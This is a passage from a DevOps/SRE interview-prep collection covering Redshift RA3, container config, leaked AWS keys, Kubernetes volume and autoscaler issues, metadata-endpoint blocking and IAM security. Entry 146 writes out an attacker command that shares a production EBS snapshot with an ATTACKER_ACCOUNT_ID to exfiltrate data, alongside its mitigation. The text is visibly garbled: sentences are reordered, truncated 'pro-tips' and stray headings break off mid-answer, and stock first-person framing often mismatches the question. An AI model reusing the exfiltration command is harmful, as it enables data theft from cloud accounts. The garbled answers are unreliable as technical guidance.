- Immediate Triage: You would append a Condition block to their overarching IAM Policy (or a global SCP) that heavi
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-136-aws-q120-a-data-analytics-team-is-migrating-from-traditional-amazon-redshift-dc2-instances-to-the-modern-ra3-node-types-what-massive-architectural-paradigm-shift-does-ra3-bring-that-drastically-reduces-costs-l2"></a>
### 136. AWS Q120: A data analytics team is migrating from traditional Amazon Redshift DC2 instances to the modern RA3 node types What massive architectural paradigm shift does RA3 bring that drastically reduces costs [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A data analytics team is migrating from traditional Amazon Redshift DC2 instances to the modern RA3 node types. What massive architectural paradigm shift does RA3 bring that drastically reduces costs?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. The interviewer is testing: Redshift compute and storage separation.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Legacy Redshift nodes (like DC2/DS2) tightly coupled Compute and Storage physically onto the single instance. If you strictly needed 50TB of storage, you were forced to aggressively provision and pay for dozens of compute nodes, even if you only ran 3 simple SQL queries a day, wasting immense amounts of money. **RA3 Nodes** natively introduce the **Separation of Compute and Storage**. Compute instances only hold a small local cache. The vast majority of the 50TB of data is seamlessly offloaded securely into S3 storage. You can now aggressively scale compute solely for the query performance you require independent of your massive data volume, resulting in huge savings. --- *More AWS scenarios added periodically. PRs welcome.*

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Legacy Redshift nodes (like DC2/DS2) tightly coupled Compute and Storage physically onto the single instance. If you strictly need.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Legacy Redshift nodes (like DC2/DS2) tightly coupled Compute and Storage physically onto the si
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-137-docker-q76-you-deploy-a-cluster-of-50-identical-microservices-to-ensure-zero-drifts-they-all-pull-a-massive-1gb-initial-configuration-file-from-a-central-s3-bucket-immediately-upon-booting-via-the-cmd-script-why-is-this-an-anti-pattern-in-container-architecture-and-what-is-the-immutable-alternative-l3"></a>
### 137. Docker Q76: You deploy a cluster of 50 identical microservices To ensure zero drifts they all pull a massive 1GB initial configuration file from a central S3 bucket immediately upon booting via the CMD script Why is this an anti-pattern in container architecture and what is the immutable alternative [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Docker` • `Must enable BuildKit` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Docker` `Must enable BuildKit` `L3` `Containers` `Linux`

> **Interview Question:**  
> *"You deploy a cluster of 50 identical microservices. To ensure zero drifts, they all pull a massive 1GB initial configuration file from a central S3 bucket immediately upon booting via the `CMD` script. Why is this an anti-pattern in container architecture, and what is the immutable alternative?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Container stability relies on clean signal handling (SIGTERM vs SIGKILL) and immutable image tagging. The interviewer is testing: Immutable infrastructure, startup performance, config-maps.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This brutally violates the principle of **Immutable Infrastructure** and destroys startup agility. If the S3 bucket goes down, your containers cannot boot. If you deploy 50 pods simultaneously, you abruptly trigger a 50GB spike of completely duplicate network traffic, severely delaying readiness. *Alternative:* Small, rapidly changing configurations should be mounted externally at runtime via **Kubernetes ConfigMaps** or Docker Swarm Configs (which use fast local tmpfs). If the 1GB file is structurally static (like a machine learning model), it must be baked directly into the Docker image tightly during the CI/CD build phase. The image then acts as an immutable, instant-booting artifact universally across environments. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This brutally violates the principle of Immutable Infrastructure and destroys startup agility..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This brutally violates the principle of Immutable Infrastructure and destroys startup agility.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-138-git-q16-a-developer-accidentally-committed-an-aws-access-key-and-pushed-it-to-the-public-repo-the-team-noticed-30-minutes-later-whats-the-correct-response-in-priority-order-l2"></a>
### 138. Git Q16: A developer accidentally committed an AWS access key and pushed it to the public repo The team noticed 30 minutes later Whats the correct response in priority order [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Git` • `Collaboration & Remote Workflows` | **Type:** `Production Scenario [L2]`

**Tags:** `Git` `Collaboration & Remote Workflows` `L2` `Version Control` `Collaboration`

> **Interview Question:**  
> *"A developer accidentally committed an AWS access key and pushed it to the public repo. The team noticed 30 minutes later. What's the correct response, in priority order?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Git is an immutable directed acyclic graph (DAG); knowing commands like git reflog means you never truly lose commits. The interviewer is testing: Incident response thinking; understanding that Git history rewriting alone is not enough.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Treat the credential as compromised the moment it touches a public surface. Order matters:

- **Rotate the credential first, before anything else.** In AWS IAM, deactivate the leaked key and issue a new one. Anything you do to Git history is secondary — the key was public for 30 minutes, scrapers are constant, and assume it was harvested.
- **Audit usage.** Check CloudTrail for any calls authenticated with that key — region, source IP, services touched. If anything looks suspicious, escalate to security.
- **Remove the secret from history.** A plain `git revert` is **not enough** — the file is still in old commits in `.git/objects` and visible on GitHub forever. Use `git filter-repo` (the modern replacement for `filter-branch`):

##### 2️⃣ Remediation & Permanent Safeguards

or `--replace-text` to redact a string everywhere. Then force-push (this rewrites history; coordinate with the team). The order is non-negotiable: rotate → audit → scrub → prevent. Reversing 1 and 3 is a common mistake — you can't un-leak a key, but you can stop it from being valid. --- ## 🔴 Advanced ---

- **Invalidate forks and caches.** GitHub caches the SHA — open a support ticket asking them to purge the leaked commit, and tell anyone with a fork to re-clone.
- **Add prevention.** Pre-commit hook with `gitleaks` or `detect-secrets`, plus push protection / secret scanning enabled at the org level so this is blocked next time.

```bash
git filter-repo --path secrets.env --invert-paths
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Rotate the credential first, before anything else. In AWS IAM, deactivate the leaked key and issue a new one. Anything you do to G.

#### ⏱️ 60-Second Elevator Pitch Summary

- Rotate the credential first, before anything else. In AWS IAM, deactivate the leaked key and issu...
- Audit usage. Check CloudTrail for any calls authenticated with that key — region, source IP, serv...
- Remove the secret from history. A plain git revert is not enough — the file is still in old commi...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-139-kubernetes-q31-a-statefulset-pod-cant-start-because-its-trying-to-attach-a-volume-thats-still-attached-to-a-terminated-pod-on-a-dead-node-how-do-you-fix-it-l3"></a>
### 139. Kubernetes Q31: A StatefulSet pod cant start because its trying to attach a volume thats still attached to a terminated pod on a dead node How do you fix it [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Kubernetes` • `Storage` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Kubernetes` `Storage` `L3` `Container Orchestration` `K8s`

> **Interview Question:**  
> *"A StatefulSet pod can't start because it's trying to attach a volume that's still attached to a terminated pod on a dead node. How do you fix it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In one of our high-traffic production clusters, our SRE team handled this incident using a standardized runbook. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This is a common scenario when a node dies without gracefully releasing its volumes. The PV shows `Terminating` or the pod shows volume attach error.

- Force delete the stuck pod: `kubectl delete pod  --grace-period=0 --force`
- Check if the PV is stuck: `kubectl describe pv ` — look for the node it's attached to.
- On AWS (EBS): use AWS CLI to force detach the volume: `aws ec2 detach-volume --volume-id  --force`

##### 2️⃣ Remediation & Permanent Safeguards

Steps: --- ## 🟣 RBAC & Security ---

- Check the VolumeAttachment object: `kubectl get volumeattachment` — delete the stuck one.
- The new pod should then attach the volume successfully.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Force delete the stuck pod: kubectl delete pod  --grace-period=0 --force.

#### ⏱️ 60-Second Elevator Pitch Summary

- Force delete the stuck pod: kubectl delete pod  --grace-period=0 --force
- Check if the PV is stuck: kubectl describe pv  — look for the node it's attached to.
- On AWS (EBS): use AWS CLI to force detach the volume: aws ec2 detach-volume --volume-id  --force

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-140-kubernetes-q62-a-cluster-autoscaler-is-not-scaling-up-even-though-pods-are-pending-what-could-be-wrong-l3"></a>
### 140. Kubernetes Q62: A cluster-autoscaler is not scaling up even though pods are Pending What could be wrong [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Kubernetes` • `Advanced Scenarios` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Kubernetes` `Advanced Scenarios` `L3` `Container Orchestration` `K8s`

> **Interview Question:**  
> *"A cluster-autoscaler is not scaling up even though pods are Pending. What could be wrong?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When troubleshooting Kubernetes, I always follow a structured layered model: Pod status -> Events -> Logs -> Network. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Check: CA logs — `kubectl logs -n kube-system ` — it logs exactly why it's not scaling.

- **Pod is unschedulable for a reason other than resources** — e.g., node affinity requires a specific label that no node type has. CA won't add nodes it can't schedule the pod on.
- **Max node count reached** — CA has a configured max. `--max-nodes-total` or per-node-group limit.
- **Pod has `cluster-autoscaler.kubernetes.io/safe-to-evict: false`** — CA may refuse to scale if eviction of existing pods is blocked.
- **Cooldown period** — CA has a scale-up cooldown (default 10 min). May be waiting.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Budget exhausted** — cloud account has hit EC2/VM quota.
- **CA can't provision the requested instance type** — spot capacity unavailable.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Pod is unschedulable for a reason other than resources — e.g., node affinity requires a specific label that no node type has. CA w.

#### ⏱️ 60-Second Elevator Pitch Summary

- Pod is unschedulable for a reason other than resources — e.g., node affinity requires a specific ...
- Max node count reached — CA has a configured max. --max-nodes-total or per-node-group limit.
- Pod has cluster-autoscaler.kubernetes.io/safe-to-evict: false — CA may refuse to scale if evictio...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-141-kubernetes-q106-how-do-you-restrict-a-pod-from-accessing-the-cloud-metadata-endpoint-eg-169254169254-l2"></a>
### 141. Kubernetes Q106: How do you restrict a pod from accessing the cloud metadata endpoint (eg 169254169254) [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Kubernetes` • `Additional Kubernetes Scenarios (Q101-Q200)` | **Type:** `Production Scenario [L2]`

**Tags:** `Kubernetes` `Additional Kubernetes Scenarios (Q101-Q200)` `L2` `Container Orchestration` `K8s`

> **Interview Question:**  
> *"How do you restrict a pod from accessing the cloud metadata endpoint (e.g., 169.254.169.254)?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When troubleshooting Kubernetes, I always follow a structured layered model: Pod status -> Events -> Logs -> Network. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Without restriction, any pod can query the EC2 metadata endpoint and potentially steal the node's IAM role credentials. Block it with NetworkPolicy: On EKS: use IMDSv2 which requires a hop limit of 1 (pods can't reach it since they're an extra hop). Configure in the launch template.

```bash
spec:
  podSelector: {}  # all pods
  policyTypes: [Egress]
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
          - 169.254.169.254/32
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Without restriction, any pod can query the EC2 metadata endpoint and potentially steal the node's IAM role credentials. Block it w.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Without restriction, any pod can query the EC2 metadata endpoint and potentially steal the node
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-142-security-q1-a-developer-accidentally-pushed-an-aws-access-key-and-secret-key-to-a-public-github-repository-what-steps-do-you-take-l1"></a>
### 142. Security Q1: A developer accidentally pushed an AWS Access Key and Secret Key to a public GitHub repository What steps do you take [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A developer accidentally pushed an AWS Access Key and Secret Key to a public GitHub repository. What steps do you take?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Incident response workflow for leaked credentials, containment vs. investigation.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This is a critical security incident. The immediate priority is **Containment**:

- Go directly to AWS IAM and **Deactivate** (do not immediately delete) the leaked access key. Deactivating stops any further use while preserving it for forensics.
- Check AWS CloudTrail immediately for any actions performed by that specific access key since the time of the leak. Look for EC2 instance spawning (crypto-mining), IAM privilege escalation, or data exfiltration.
- Review the code repository and rewrite the Git history to remove the credentials permanently, then force push the clean history.

##### 2️⃣ Remediation & Permanent Safeguards

---

- If the key was used maliciously, initiate your organization's Incident Response Plan (e.g., isolating compromised instances, rotating related secrets).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Go directly to AWS IAM and Deactivate (do not immediately delete) the leaked access key. Deactivating stops any further use while .

#### ⏱️ 60-Second Elevator Pitch Summary

- Go directly to AWS IAM and Deactivate (do not immediately delete) the leaked access key. Deactiva...
- Check AWS CloudTrail immediately for any actions performed by that specific access key since the ...
- Review the code repository and rewrite the Git history to remove the credentials permanently, the...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-143-security-q2-your-security-scanner-reports-that-a-docker-image-you-deploy-has-5-critical-vulnerabilities-inside-a-system-library-however-your-application-doesnt-even-use-that-library-how-do-you-handle-this-l2"></a>
### 143. Security Q2: Your security scanner reports that a Docker image you deploy has 5 Critical vulnerabilities inside a system library However your application doesnt even use that library How do you handle this [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your security scanner reports that a Docker image you deploy has 5 "Critical" vulnerabilities inside a system library. However, your application doesn't even use that library. How do you handle this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: Vulnerability management, distroless images, practical risk assessment.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

A critical CVE in an unused library still poses a risk if an attacker finds a way to execute it (e.g., via a remote code execution exploit in your main app that invokes the system shell), but it's a lower priority than an exploit in your direct code.

- **Short term:** Suppress the finding mathematically showing it's unreachable, or update the base image if a patch is available.
- **Long term (Better):** Rebuild the Docker image using a **Distroless** base image or `scratch`. Distroless images contain only your application and its direct runtime dependencies (no package managers, no shells, no unnecessary system libraries). This drastically reduces the attack surface and eliminates the vast majority of scanner noise.

##### 2️⃣ Remediation & Permanent Safeguards

The SRE/DevSecOps approach is: ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Short term: Suppress the finding mathematically showing it's unreachable, or update the base image if a patch is available..

#### ⏱️ 60-Second Elevator Pitch Summary

- Short term: Suppress the finding mathematically showing it's unreachable, or update the base imag...
- Long term (Better): Rebuild the Docker image using a Distroless base image or scratch. Distroless...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-144-security-q3-you-need-to-give-an-ec2-instance-access-to-read-from-an-s3-bucket-a-junior-engineer-suggests-creating-an-iam-user-generating-access-keys-and-hardcoding-them-into-the-app-why-is-this-bad-and-what-is-the-correct-way-l2"></a>
### 144. Security Q3: You need to give an EC2 instance access to read from an S3 bucket A junior engineer suggests creating an IAM User generating access keys and hardcoding them into the app Why is this bad and what is the correct way [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"You need to give an EC2 instance access to read from an S3 bucket. A junior engineer suggests creating an IAM User, generating access keys, and hardcoding them into the app. Why is this bad, and what is the correct way?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: IAM Roles, temporary credentials, avoiding static secrets.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Hardcoding static AWS Access Keys is highly insecure because they can be easily leaked in source code, logs, or machine images, and they do not automatically rotate.

- Create an IAM Policy that grants exactly `s3:GetObject` on the specific bucket ARN.
- Attach this policy to an IAM Role.
- Attach the IAM Role to the EC2 instance via an Instance Profile.

##### 2️⃣ Remediation & Permanent Safeguards

The correct way is to use an **IAM Role for EC2**: ---

- The application uses the AWS SDK, which automatically queries the EC2 Metadata Service (`169.254.169.254`) to fetch temporary, automatically rotating, short-lived STS credentials to access S3 seamlessly.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Create an IAM Policy that grants exactly s3:GetObject on the specific bucket ARN..

#### ⏱️ 60-Second Elevator Pitch Summary

- Create an IAM Policy that grants exactly s3:GetObject on the specific bucket ARN.
- Attach this policy to an IAM Role.
- Attach the IAM Role to the EC2 instance via an Instance Profile.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-145-security-q4-your-company-wants-to-ensure-that-a-specific-s3-bucket-containing-pii-can-only-be-accessed-from-a-designated-vpc-even-by-aws-administrators-with-full-s3-permissions-how-do-you-enforce-this-l3"></a>
### 145. Security Q4: Your company wants to ensure that a specific S3 bucket containing PII can *only* be accessed from a designated VPC even by AWS administrators with Full S3 permissions How do you enforce this [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your company wants to ensure that a specific S3 bucket containing PII can *only* be accessed from a designated VPC, even by AWS administrators with Full S3 permissions. How do you enforce this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: S3 Bucket Policies, VPC Endpoints, defense in depth.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

IAM policies dictate *who* can access a resource, but an **S3 Bucket Policy** dictates the conditions under which the bucket itself accepts requests, overriding IAM permissions.

- Create an S3 VPC Gateway Endpoint (or Interface Endpoint) in the designated VPC.
- Apply a strict Bucket Policy to the S3 bucket that uses a `Deny` statement to block all `s3:*` actions if the `aws:sourceVpce` condition does NOT match the ID of the specific VPC Endpoint.

##### 2️⃣ Remediation & Permanent Safeguards

To enforce this, I would: Because explicit Denys always override Allows in AWS IAM evaluation, even a user with `AdministratorAccess` will be blocked from accessing the bucket if they try to call the S3 API from the public internet or another VPC. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Create an S3 VPC Gateway Endpoint (or Interface Endpoint) in the designated VPC..

#### ⏱️ 60-Second Elevator Pitch Summary

- Create an S3 VPC Gateway Endpoint (or Interface Endpoint) in the designated VPC.
- Apply a strict Bucket Policy to the S3 bucket that uses a Deny statement to block all s3:* action...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-146-security-q5-an-attacker-gains-ssh-access-to-a-web-server-running-in-aws-the-web-server-has-an-iam-role-attached-that-allows-taking-ec2-snapshots-the-attacker-uses-this-role-to-snapshot-your-production-database-server-but-they-cant-download-it-from-aws-because-the-snapshot-is-internal-how-might-they-still-steal-your-data-l2"></a>
### 146. Security Q5: An attacker gains SSH access to a web server running in AWS The web server has an IAM Role attached that allows taking EC2 snapshots The attacker uses this role to snapshot your production database server but they cant download it from AWS because the snapshot is internal How might they still steal your data [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"An attacker gains SSH access to a web server running in AWS. The web server has an IAM Role attached that allows taking EC2 snapshots. The attacker uses this role to snapshot your production database server, but they can't download it from AWS because the snapshot is internal. How might they still steal your data?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Understanding of snapshot sharing, privilege escalation, lateral movement.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Once an attacker can create an EBS snapshot, they have effectively bypassed all OS-level database security.

- Share the snapshot with their own external AWS Account ID using the AWS CLI: `aws ec2 modify-snapshot-attribute --snapshot-id snap-1234 --create-volume-permission "Add=[{UserId=ATTACKER_ACCOUNT_ID}]"`.
- Once shared, they log into their own AWS account, create an EBS volume from the snapshot, attach it to their own EC2 instance, mount the filesystem, and freely copy all the unencrypted database files.

##### 2️⃣ Remediation & Permanent Safeguards

To steal the data, the attacker doesn't need to download the snapshot directly. Instead, they can: *Mitigation:* Use AWS KMS Customer Managed Keys (CMKs) to encrypt the root volumes; attackers cannot share snapshots encrypted with a KMS key they don't have policy access to. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Share the snapshot with their own external AWS Account ID using the AWS CLI: aws ec2 modify-snapshot-attribute --snapshot-id snap-.

#### ⏱️ 60-Second Elevator Pitch Summary

- Share the snapshot with their own external AWS Account ID using the AWS CLI: aws ec2 modify-snaps...
- Once shared, they log into their own AWS account, create an EBS volume from the snapshot, attach ...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-147-security-q6-explain-the-principle-of-least-privilege-l1"></a>
### 147. Security Q6: Explain the principle of Least Privilege [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Explain the principle of Least Privilege."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: Core security concepts.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

The Principle of Least Privilege states that a user, application, or system process should be given the bare minimum permissions necessary to perform its required function, and absolutely nothing more. For example, if an application only needs to read objects from an S3 bucket, it should be granted `s3:GetObject` on that specific bucket ARN, rather than `s3:*` (full S3 access) or `*.*` (admin access). This minimizes the "blast radius" if the application or identity is ever compromised. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The Principle of Least Privilege states that a user, application, or system process should be given the bare minimum permissions n.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: The Principle of Least Privilege states that a user, application, or system process should be g
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-148-security-q7-your-team-uses-kubernetes-currently-all-developers-have-cluster-admin-access-you-need-to-restrict-them-so-they-can-only-manage-deployments-in-their-specific-namespace-without-affecting-others-how-do-you-implement-this-l2"></a>
### 148. Security Q7: Your team uses Kubernetes Currently all developers have cluster-admin access You need to restrict them so they can only manage deployments in their specific namespace without affecting others How do you implement this [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your team uses Kubernetes. Currently, all developers have `cluster-admin` access. You need to restrict them so they can only manage deployments in their specific namespace, without affecting others. How do you implement this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Kubernetes RBAC (Role-Based Access Control).. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

I would implement Kubernetes RBAC by combining generic Roles with specific RoleBindings.

- Create a `Role` (namespaced) that defines the allowed actions, e.g., `create`, `get`, `update`, `delete` on resources like `pods`, `deployments`, and `services`.
- Do not use a `ClusterRole` (unless you want to define a global template to be bound locally). A `ClusterRole` applies globally, whereas a `Role` is restricted to a single namespace.
- Create a `RoleBinding` in the developer's specific namespace (e.g., `namespace-frontend`). This binds the `Role` permissions to the developer's user identity or Azure AD/OIDC group.

##### 2️⃣ Remediation & Permanent Safeguards

Now, the developer has full control inside `namespace-frontend`, but if they try to run `kubectl delete pod` in the `kube-system` namespace, the Kubernetes API server will reject it with a 403 Forbidden. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Create a Role (namespaced) that defines the allowed actions, e.g., create, get, update, delete on resources like pods, deployments.

#### ⏱️ 60-Second Elevator Pitch Summary

- Create a Role (namespaced) that defines the allowed actions, e.g., create, get, update, delete on...
- Do not use a ClusterRole (unless you want to define a global template to be bound locally). A Clu...
- Create a RoleBinding in the developer's specific namespace (e.g., namespace-frontend). This binds...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-149-security-q8-during-an-audit-you-discover-that-database-passwords-are-being-passed-to-docker-containers-as-plaintext-environment-variables-via-the-orchestration-tool-you-are-asked-to-implement-a-secure-secret-management-system-explain-the-architecture-l3"></a>
### 149. Security Q8: During an audit you discover that database passwords are being passed to Docker containers as plaintext Environment Variables via the orchestration tool You are asked to implement a secure Secret Management system Explain the architecture [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"During an audit, you discover that database passwords are being passed to Docker containers as plaintext Environment Variables via the orchestration tool. You are asked to implement a secure Secret Management system. Explain the architecture."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: Vault/Secrets Manager architectures, sidecar pattern, memory-only secrets.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

